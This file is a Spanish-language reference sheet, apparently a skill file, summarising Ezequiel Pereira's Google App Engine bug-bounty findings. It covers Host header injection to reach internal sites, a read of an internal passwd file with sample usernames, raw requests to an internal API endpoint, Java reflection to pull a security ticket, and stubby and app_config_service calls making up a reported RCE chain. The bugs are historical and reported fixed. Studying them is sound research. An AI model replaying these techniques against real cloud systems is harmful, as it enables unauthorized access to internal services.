---
name: bughunters-gae-rce
description: 'Personal Google VRP reports by Ezequiel Pereira — Google App Engine bugs: Host header injection to reach internal googleplex sites ($10k), /etc/passwd.borg LFI in Java 8 runtime, $36k RCE via internal GAE APIs (stubby RPC + app_config_service). Internal API endpoint at 169.254.169.253:10001. Staging env access via Host header to <PROJECT>.prom-nightly.sandbox.google.com. Spanish triggers — "google app engine rce", "gae rce", "appspot rce", "gae internal api", "stubby gcp", "app_config_service gae", "169.254.169.253", "gae staging env", "app engine host header", "gae host injection", "gae java interno".'
---

## Google App Engine — Bug Series (Ezequiel Pereira, 2017-2018)

**Fingerprint GAE:** Response header `X-Cloud-Trace-Context: <hex>` en cualquier app corriendo en GAE.

**Google apps que corren en GAE:**
- `*.googleplex.com`
- `*.withgoogle.com`
- `vrp-game.appspot.com` (antiguo dashboard VRP)
- `www.google.com/appserve/*` (incluyendo el formulario de reporte de seguridad)

---

### Bug 1 — Host header injection → acceso a sitio interno ($10k, 2017)

Enviar a `www.appspot.com` (via HTTPS):
```
GET /eng HTTP/1.1
Host: yaqs.googleplex.com
```
Resultado: respuesta del sitio interno `yaqs.googleplex.com` sin autenticación adicional.

**Técnica generalizable:** cualquier host de `*.googleplex.com` o `*.withgoogle.com` puede ser destino via este Host header injection sobre el frontend de appspot.com.

---

### Bug 2 — LFI /etc/passwd.borg en Java 8 GAE ($0 reward, 2017-2018)

Construir una app GAE en Java 8 y leer `/etc/passwd.borg`:
```
page:x:2501:5000::/user/page:/bin/bash
sergey:x:2503:5000::/user/sergey:/bin/bash
ken:x:2527:5000::/user/ken:/bin/bash
emergency:x:2542:5000::/user/emergency:/bin/bash
siriusc:x:2600:5000::/user/siriusc:/bin/bash
```
Lista completa de @google.com email addresses (excluyendo Google Groups). Rewarded $0 por no ser considerado impacto suficiente.

---

### Internal GAE API endpoint

Todas las llamadas de la app GAE a servicios internos pasan por:
```
POST /rpc_http HTTP/1.1
Host: 169.254.169.253:10001
X-Google-RPC-Service-Endpoint: app-engine-apis
X-Google-RPC-Service-Method: /VMRemoteAPI.CallRemoteAPI
Content-Type: application/octet-stream
Content-Length: <LENGTH>

<Protobuf: Call "<service>.<Method>" with params>
```

**APIs internas completas en GAE:**
```
app_identity_service   images
app_config_service     modules
blobstore              rdbms
datastore_v3           stubby          ← RCE vector
datastore_v4           taskqueue
file                   urlfetch
search                 basement        ← Gaia lookup
remote_socket
logservice
```

**Extraer security ticket via Java reflection (Java 8 runtime):**
```java
Method getSecurityTicket = ApiProxy.getCurrentEnvironment()
  .getClass().getDeclaredMethod("getSecurityTicket");
getSecurityTicket.setAccessible(true);
String security_ticket = (String) getSecurityTicket
  .invoke(ApiProxy.getCurrentEnvironment());
```

**Obtener nombre del service account:**
```java
import com.google.appengine.api.appidentity.AppIdentityService;
import com.google.appengine.api.appidentity.AppIdentityServiceFactory;

AppIdentityService appIdentity = AppIdentityServiceFactory.getAppIdentityService();
String serviceAccount = appIdentity.getServiceAccountName();
```

---

### Bug 3 — Acceso al staging environment de GAE ($36k RCE chain, 2018)

**Paso 1 — Acceder al staging via Host header** (mismo vector que Bug 1):
```
GET / HTTP/1.1
Host: the-expanse.prom-nightly.sandbox.google.com
```
Enviar a `www.appspot.com` via HTTPS. También funciona con `prom-qa`.

**Paso 2 — El staging tiene APIs internas sin restricciones**

En staging, el endpoint `169.254.169.253:10001` acepta llamadas a APIs normalmente bloqueadas en prod.

---

### RCE via Stubby (internal Google RPC infrastructure)

**Stubby** es la infraestructura RPC interna de Google. Accesible como GAE API en staging.

**Paso 1 — Obtener Stub ID:**
```json
stubby.GetStubId({
  "host": "google.com:80"
})
```
Otros hosts válidos:
- `pantheon.corp.google.com:80`
- `blade:monarch-cloud_prod-streamz`
- Cualquier servidor interno de Google

Responde con un `stub_id`.

**Paso 2 — Llamar cualquier servicio interno:**
```json
stubby.Send({
  "stubby_method": "/<SERVICE>.<METHOD>",
  "stubby_request": "<PB>",
  "stub_id": "<STUB_ID>"
})
```

**Enumerar servicios disponibles en un host:**
```json
stubby.Send({
  "stubby_method": "/ServerStatus.GetServices",
  "stubby_request": "",
  "stub_id": "<STUB_ID>"
})
```

---

### RCE via app_config_service (cambiar settings de la app)

**Leer configuración actual:**
```
app_config_service.GetAppConfig({ app_id: "<GCP_PROJECT>" })
```

**Modificar configuración:**
```
app_config_service.ConfigApp(<GlobalConfig modificado>)
```

**Cosas modificables:**
- Quota limits (bypass de cuotas)
- Permissions — acceso a Google3 filesystem (archivos de APIs/servicios internos)
- `SuperApp` designation — permisos elevados dentro de GAE
- `service_account_id` — cambiar identidad del service account
- Email sender restrictions

**SetAdminConfig** — método adicional que acepta `SetAdminConfigRequest`.

**basement.GaiaLookupByUserEmail** — lookup de usuarios internos de Google por email.

---

### Timeline y reward
- **Feb 25, 2018** — reporte inicial (stubby API) → P1 severity
- **Mar 4-5, 2018** — descubrimiento de app_config_service → P0
- **Mar 13, 2018** — $36,337 reward (RCE clasificado; $5k extra por segundo bug)
- **May 20, 2018** — write-up publicado
- **May 16, 2018** — fix confirmado

---

### Técnicas usadas para descubrimiento
- Nmap compilado estáticamente subido a GAE para port scanning desde dentro
- Cliente C++ gRPC custom compilado y ejecutado dentro del runtime GAE
- `strings | grep` en binarios del launcher para encontrar servicios
- Extracción de protobuf definitions desde JAR/CLASS compilados
- Análisis de argumentos del launcher Java via C++ library
